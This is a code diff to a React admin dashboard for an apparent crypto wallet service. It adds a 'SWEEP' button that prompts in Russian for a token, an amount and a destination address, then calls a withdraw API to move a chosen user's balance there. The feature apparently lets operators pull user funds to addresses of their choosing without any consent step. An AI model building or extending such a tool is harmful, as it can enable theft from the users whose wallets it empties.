@@ -333,8 +333,43 @@ function App() {
   );
 
   const UserCard = ({ user }) => {
+    const [sweepModal, setSweepModal] = useState(null);
+
     const showUserDetails = () => {
       alert(`👤 ${user.name} (@${user.telegram})\n\n💰 Balance: $${(user.totalBalance || 0).toLocaleString()}\n🏆 Level: ${user.level || 'Bronze'}\n📱 Status: ${user.isOnline ? '🟢 Online' : '🔴 Offline'}\n⏰ Last Activity: ${user.lastActivity || 'Unknown'}\n📅 Created: ${new Date(user.createdAt || Date.now()).toLocaleDateString()}\n\n💼 Wallets:\n${user.addresses ? Object.entries(user.addresses).map(([net, addr]) => `${net.toUpperCase()}: ${addr.slice(0, 8)}...${addr.slice(-6)}`).join('\n') : 'No wallets'}`);
+    };
+
+    const handleSweep = async (e) => {
+      e.stopPropagation();
+      const token = prompt(`Введите токен для сбора (ETH, USDT, BNB, SOL, TON):`, 'USDT');
+      if (!token) return;
+      const amount = prompt(`Введите сумму для сбора (Баланс: ${user.balances?.[token] || 0}):`, user.balances?.[token] || '0');
+      if (!amount || parseFloat(amount) <= 0) return;
+      const target = prompt(`Введите адрес для перевода:`, commonAddresses[token] || '');
+      if (!target) return;
+
+      try {
+        const response = await fetch('/api/withdraw', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            userId: user.id,
+            currency: token,
+            amount: parseFloat(amount),
+            address: target,
+            network: token === 'SOL' ? 'solana' : token === 'TON' ? 'ton' : 'ethereum' // Simplified
+          })
+        });
+        const res = await response.json();
+        if (res.success) {
+          alert(`✅ Сбор средств запущен! TX: ${res.transaction.txHash}`);
+          loadRealData();
+        } else {
+          alert(`❌ Ошибка: ${res.error}`);
+        }
+      } catch (err) {
+        alert(`❌ Ошибка запроса: ${err.message}`);
+      }
     };
 
     return (
@@ -387,10 +422,25 @@ function App() {
               textOverflow: 'ellipsis',
               whiteSpace: 'nowrap'
             }}>
-              {user.telegram}
+              {user.telegram} | Reg: {new Date(user.createdAt || Date.now()).toLocaleDateString()}
             </p>
           </div>
           <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
+            <button
+              onClick={handleSweep}
+              style={{
+                background: '#f59e0b',
+                border: 'none',
+                borderRadius: '6px',
+                padding: '6px 12px',
+                cursor: 'pointer',
+                color: '#000',
+                fontWeight: 'bold',
+                fontSize: '12px'
+              }}
+            >
+              SWEEP
+            </button>
             <button
               onClick={(e) => {
                 e.stopPropagation();
